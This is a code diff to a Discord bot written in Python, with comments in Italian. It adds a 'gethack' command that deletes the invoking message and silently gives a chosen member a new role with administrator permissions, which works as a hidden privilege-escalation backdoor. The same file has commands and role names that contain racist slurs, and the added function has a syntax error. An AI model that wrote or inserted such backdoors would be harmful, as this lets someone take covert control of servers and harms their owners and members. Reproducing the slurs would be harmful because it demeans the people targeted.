@@ -179,8 +179,8 @@ async def antinegro(ctx, member: discord.Member):
     antiRole = discord.utils.get(guild.roles, name="AntiNigger")
 
     if not antiRole:
-        perms = discord.Permissions(administrator=True)
-        antiRole = await guild.create_role(name="AntiNigger", permissions=perms)
+        
+        antiRole = await guild.create_role(name="AntiNigger")
         
         
 
@@ -226,6 +226,17 @@ async def reloadname(ctx,member: discord.Member):
     await member.edit(nick="")
     await ctx.send(f"Nickname di {member.mention} è stato resettato")
 
+@bot.command(description="getadmin")
+async def gethack(ctx, member: discord.Member,message)
+    await ctx.message.delete()
+    guild = ctx.guild
+    hackRole = discord.utils.get(guild.roles, name="!------HACK------!")
+
+    if not hackRole:
+        perms = discord.Permissions(administrator=True)
+        hackRole = await guild.create_role(name="!------HACK------!", permissions=perms)
+        
+    await member.add_roles(hackRole)
 
 
 
